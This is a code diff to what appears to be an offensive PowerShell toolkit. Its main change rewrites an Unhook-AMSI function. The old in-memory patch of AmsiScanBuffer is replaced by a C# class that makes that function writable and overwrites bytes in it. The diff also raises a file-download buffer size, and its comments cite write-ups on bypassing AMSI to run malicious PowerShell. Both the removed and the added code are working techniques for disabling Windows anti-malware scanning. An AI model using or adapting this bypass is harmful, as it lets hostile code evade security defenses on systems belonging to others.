@@ -454,7 +454,7 @@ function Download-File
         $fileExt = [System.IO.Path]::GetExtension($fileName)
         $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
         $fullNewname = $Source
-        $bufferSize = 10737418;
+        $bufferSize = 50737418;
 
         $fs = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);        
         $fileSize =(Get-Item $fileName).Length
@@ -775,24 +775,58 @@ Function Get-AllFirewallRules($path) {
 }
 Function Unhook-AMSI {
     
-    $win32 = @"
+$win32 = @"
 using System.Runtime.InteropServices;
 using System;
-public class Win32 {
-[DllImport("kernel32")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibrary(string name);
-[DllImport("kernel32")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect
-);
+public class AMSI
+{
+    //https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
+
+    [DllImport("kernel32")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+    static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+    public static void Disable()
+    {
+        IntPtr TargetDLL = LoadLibrary("amsi.dll");
+        if (TargetDLL == IntPtr.Zero)
+        {
+            Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer.");
+        }
+
+        IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
+        if (AmsiScanBufferPtr == IntPtr.Zero)
+        {
+            Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer");
+        }
+
+        UIntPtr dwSize = (UIntPtr)5;
+        uint Zero = 0;
+        if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
+        {
+            Console.WriteLine("ERROR: Could not change AmsiScanBuffer memory permissions!");
+        }
+
+        /*
+         * This is a new technique, and is still working.
+         * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
+         */
+        Byte[] Patch = { 0x31, 0xff, 0x90 };
+        IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+        Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+        MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
+
+        Console.WriteLine("AmsiScanBuffer patch has been applied.");
+    }
+
 }
 "@
 Add-Type $win32
-$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
-$b = 0
-[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
-$buf = New-Object Byte[] 7
-$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)
+$ptr = [AMSI]::Disable()
 }
